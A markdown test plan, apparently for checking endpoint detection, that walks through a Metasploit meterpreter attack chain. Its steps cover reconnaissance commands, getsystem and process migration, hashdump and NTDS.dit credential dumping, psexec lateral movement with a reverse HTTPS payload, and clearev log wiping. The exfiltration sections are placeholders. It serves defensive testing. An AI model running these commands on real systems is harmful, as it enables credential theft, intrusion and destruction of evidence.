# Phase 1 Testing

## Discovery

Demostrate scanning, recon and targeting activity external to the system

```
<recond examples>
```

On target machine download the three payloads, record if any alerts fire for this activity. 
You may also try different browsers as that can result in different checks and hooks used by the endpoint software.

If all files are blocked you can either allow the downloads manaually in the security stack or conclude the test.


## Initial Access

Demostrate initial access

```
<initial access example>
```

Run the three test files from 1 to 3 by simply double clicking, and record the detection results. It is recommended to right click and run at least one of the payloads as Administrator to facilitate later testing for privesc.

## Discovery

The rests of the tests will be ran from out created meterpreter sessions.

First let's run systeminfo on the system:
(session -i start an interactive sessions where N is the number of the meterpreter session your host has established.)
```
msf6 exploit(multi/handler) > sessions -i N
[*] Starting interaction with N...

meterpreter > shell


systeminfo
```

The second discover task is to look for connected domain trusts and administrative accounts.

*Execute these commands using a shell that is not SYSTEM but a domain user account*
```
msf6 exploit(multi/handler) > sessions -i N
[*] Starting interaction with N...

meterpreter > shell

net group "enterprise admins" /domain
net group "domain admins" /domain
```

The third discovery task will look for local accounts and groups.

```
msf6 exploit(multi/handler) > sessions -i N
[*] Starting interaction with N...

meterpreter > shell

whoami /groups
net view /all
```

## Local Privilege Escalation

The fourth group of tasks starts with becoming SYSTEM run the following in your meterpreter session:
```
msf6 exploit(multi/handler) > sessions -i N
[*] Starting interaction with N...

meterpreter > getsystem 
```

After becoming system target a process to inject into, a good recommendation is winlogon.exe as it keeps SYSTEM priv and will stay active as well as make sure you are running a compatible architechure for dumping credentials later.
```
msf6 exploit(multi/handler) > sessions -i N
[*] Starting interaction with N...

(List Processes with ps)

meterpreter > ps
```
Pick a process that has SYSTEM and is x64

```
Process List
============

 PID   PPID  Name                         Arch  Session  User                          Path
 ---   ----  ----                         ----  -------  ----                          ----

812   708   winlogon.exe                 x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
```

(Example winlogon.exe)

Run migrate with process id of target
```
meterpreter > migrate 812
[*] Migrating from 7236 to 812...
[*] Migration completed successfully.
```
## Credential Access

Execute from session running as SYSTEM and complete Process Injection test first.
```
msf6 exploit(multi/handler) > sessions -i N
[*] Starting interaction with N...

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM


meterpreter > hashdump 
Administrator:500:EXAMPLEb51404eeaad3b435b51404ee:EXAMPLE6ae931b73c59d7e0c089c0:::
```
# Phase 2 Testing

## Lateral movement

This test starts at the conclusion of Phase 1 complete that test first before starting Phase 2.

For this test we will move laterally using the PsExec module in metasploit. We are using an assume breach methodology so run test with a user that has administrative permissions to the test user or is domain admin on the testing domain.

```
use exploit/windows/smb/psexec

msf6 exploit(windows/smb/psexec) > set payload windows/meterpreter/reverse_https

msf6 exploit(windows/smb/psexec) > set RHOST 172.16.2.X

set SMBDomain miratime.org
set SMBUser exampleuser
set SMBPass HASH/PW
set SESSION N

msf6 exploit(windows/smb/psexec) > exploit -j
```
Upon successful execution of this test you should get a new meterpreter session on the server.

![Lateral Session](https://raw.githubusercontent.com/blumirabrian/endpoint-detection-methology/main/msf/edr9.png "Lateral Session")

## Process Injection
```
msf6 exploit(multi/handler) > sessions -i N
[*] Starting interaction with N...
```
List Processes with ps
```
meterpreter > ps
```
Pick a process that has SYSTEM and is x64

```
Process List
============

 PID   PPID  Name                         Arch  Session  User                          Path
 ---   ----  ----                         ----  -------  ----                          ----

812   708   winlogon.exe                 x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
```

Example winlogon.exe

Run migrate with process id of target
```
meterpreter > migrate 812
[*] Migrating from 7236 to 812...
[*] Migration completed successfully.
```

## Credential Access Dump NTDS.dit

Assumes you have a priveleged shell on domain controller
```
msf6 exploit(multi/handler) > sessions -i N
[*] Starting interaction with N...

meterpreter > run windows/gather/credentials/domain_hashdump
```

## Defense Evasion Clear Logs

Simulate threat actor removing evidence of their intrusion.

```
msf6 exploit(multi/handler) > sessions -i N
[*] Starting interaction with N...

meterpreter > clearev
```
# Phase 3 Testing

## Establishing Covert Channels

Demonstrate adversary constructing communication channels for data transport.

```
<frpc example>
```

## Packaging

```
<example tar balling or otherwise squirreling away data for subsequent transport>
```

Simulate final objectives of when ransomware payload is executed.

## Data Exfiltration

Simulate final objectives of when ransomware payload is executed.

```
<example command like uucp/ftp/scp/http download>
```

## Impact

Simulate final objectives of when ransomware payload is executed.

```
<execution of interactive shell or other evidence/artifact of full compromise>
```
